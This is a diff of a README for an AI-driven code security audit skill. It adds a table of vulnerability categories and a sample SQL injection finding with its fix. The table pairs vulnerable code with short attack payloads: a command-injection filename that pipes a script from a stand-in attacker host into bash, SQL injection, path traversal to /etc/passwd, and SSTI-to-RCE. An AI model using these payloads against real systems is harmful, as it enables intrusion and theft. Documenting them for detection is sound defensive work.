@@ -2,7 +2,7 @@
 
 # claude-security-skills
 
-**Deep, architecture-aware vulnerability discovery skills for [Claude Code](https://claude.ai/claude-code) — finds what static scanners miss.**
+**Your CI passed. Your linter is clean. Your app is still vulnerable.**
 
 [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 [![Python 3.8+](https://img.shields.io/badge/python-3.8%2B-3776ab.svg)](https://python.org)
@@ -13,13 +13,101 @@
 
 ---
 
+Static analyzers match known patterns. This skill reasons about your codebase the way a senior security engineer would — building an architectural model, tracing untrusted data across trust boundaries, and performing ultra-granular function-level analysis to find **logic flaws, auth bypasses, and novel attack chains** that automated tools miss.
+
 Open any codebase in Claude Code and say:
 
 ```
 "Run a security audit on this codebase"
 ```
 
-Unlike linters and static analyzers that match known patterns, this skill reasons about your codebase the way a human auditor would — building a full architectural model, tracing data flows across trust boundaries, and performing ultra-granular function-level analysis to uncover logic flaws, auth bypasses, and novel attack chains that automated tools routinely miss. No configuration. No setup beyond `./install.sh`.
+No configuration. No setup beyond `./install.sh`. It asks two questions — branch and whether you want the developer guide — then runs the full pipeline autonomously.
+
+---
+
+## What it finds
+
+22 vulnerability categories, including everything in OWASP Top 10 2025:
+
+| Category | What it actually flags |
+|---|---|
+| SQL / NoSQL Injection | `cursor.execute(f"SELECT * FROM users WHERE name='{name}'"` — auth bypass with `' OR 1=1 --`, full DB dump via `UNION SELECT` |
+| OS Command Injection | `subprocess.run(f"convert {filename}", shell=True)` — RCE via filename `; curl attacker.com/shell.sh \| bash` |
+| Path Traversal | `open(uploads_dir + request.args['file'])` with no canonicalization — reads `/etc/passwd` via `../../etc/passwd` |
+| Broken Access Control | `/api/orders/{id}` checks `session['logged_in']` but never asserts `order.owner == session['user_id']` — any user reads any order |
+| Cryptographic Failures | `hashlib.md5(password.encode()).hexdigest()` — entire user table crackable with rainbow tables in minutes |
+| Hardcoded Credentials | `AWS_SECRET_KEY = "wJalrXUt..."` in `config/settings.py` — anyone with repo read access owns the AWS account |
+| SSRF | `requests.get(request.form['webhook_url'])` with no allowlist — pivots to `169.254.169.254/latest/meta-data/` for cloud credential theft |
+| XSS / SSTI | `render_template_string(user_bio)` — `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` escalates to RCE |
+| Insecure Deserialization | `pickle.loads(base64.b64decode(session_cookie))` — crafted payload executes arbitrary code on deserialization |
+| Auth Bypass | JWT library initialized with `algorithms=["none", "HS256"]` — attacker signs tokens without the secret key |
+| Mass Assignment | `User(**request.json)` with no field allowlist — adding `"role": "admin"` to the registration body grants admin rights |
+| Security Misconfiguration | `app.run(debug=True)` in production exposes the Werkzeug interactive debugger — unauthenticated RCE via any 500 error |
+| Dependency Vulnerabilities | `PyYAML==3.13` in `requirements.txt` (CVE-2017-18342) — `yaml.load()` calls anywhere in the codebase execute arbitrary Python |
+| Secrets in Logs | `logger.debug(f"Authenticating user {username} with password {password}")` — credentials land in log aggregators and rotation archives |
+| Cloud Misconfigurations | EC2 instance profile with `"Action": "*", "Resource": "*"` — SSRF to metadata service yields keys that own the entire AWS account |
+| ... and 7 more | Clickjacking, CSRF, insecure file upload, XXE, race conditions in payment flows, open redirect, missing rate limiting |
+
+---
+
+## Real finding — from the included eval app
+
+Here is an actual finding the skill produced on `vulnapp`, a deliberately vulnerable Flask app included in this repo. The finding is as-generated — no editing:
+
+**VUL-001 · CRITICAL · SQL Injection — `/login` endpoint**
+> `src/app.py:35` — Username and password interpolated directly into a raw SQL query via Python f-string. No parameterization, no escaping. Authentication can be bypassed with `' OR '1'='1` and the entire database dumped with a single `UNION SELECT`.
+
+**Vulnerable code** (`src/app.py:35`):
+```python
+# Before — exploitable
+query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+cursor.execute(query)
+```
+
+**Fixed code** (from the generated developer guide):
+```python
+# After — parameterized query
+query = "SELECT * FROM users WHERE username = ? AND password = ?"
+cursor.execute(query, (username, hashed_password))
+```
+
+The skill found **24 findings** in vulnapp: **5 Critical · 13 High · 5 Medium · 1 Low** — including SQL injection, OS command injection, path traversal, IDOR, hardcoded AWS keys, MD5 password hashing, unauthenticated debug endpoints, and credentials leaked to logs.
+
+---
+
+## Sample reports
+
+These PDFs were generated by running the skill against `vulnapp`:
+
+- [vulnapp Vulnerability Report PDF](vuln-assessment/evals/fixtures/vulnapp/vulnapp_Vulnerability_Report.pdf)
+- [vulnapp Developer Remediation Guide PDF](vuln-assessment/evals/fixtures/vulnapp/vulnapp_Developer_Remediation_Guide.pdf)
+
+<table>
+<tr>
+<td><img src="docs/screenshots/vuln-report-01.png" width="340" alt="Vulnerability report cover — dark navy layout, risk matrix, 24 findings summary"/></td>
+<td><img src="docs/screenshots/vuln-report-02.png" width="340" alt="Executive summary — severity breakdown, top attack paths"/></td>
+</tr>
+<tr>
+<td align="center"><em>Vulnerability Report — cover &amp; risk matrix</em></td>
+<td align="center"><em>Executive summary — severity breakdown</em></td>
+</tr>
+</table>
+
+<table>
+<tr>
+<td><img src="docs/screenshots/dev-guide-01.png" width="340" alt="Developer remediation guide cover page"/></td>
+<td valign="top" style="padding-left:16px">
+
+**Developer Remediation Guide** gives engineers exactly what they need to fix things:
+
+- Root-cause pattern analysis across all findings
+- Before/after code fixes with explanations
+- Highest-severity attack paths with PoC one-liners
+- 3-sprint remediation roadmap with hour estimates
+
+</td>
+</tr>
+</table>
 
 ---
 
@@ -85,7 +173,7 @@ Structured output for integration with SIEMs, ticketing systems, and CI/CD pipel
 
 ### Developer Remediation Guide _(optional)_
 
-Engineer-facing. No analyst jargon — just the information a developer needs to fix things.
+Engineer-facing. Written for the developer who owns the fix:
 
 - Root-cause pattern analysis across all findings (why the same anti-pattern keeps appearing)
 - Highest-severity attack paths with PoC one-liners
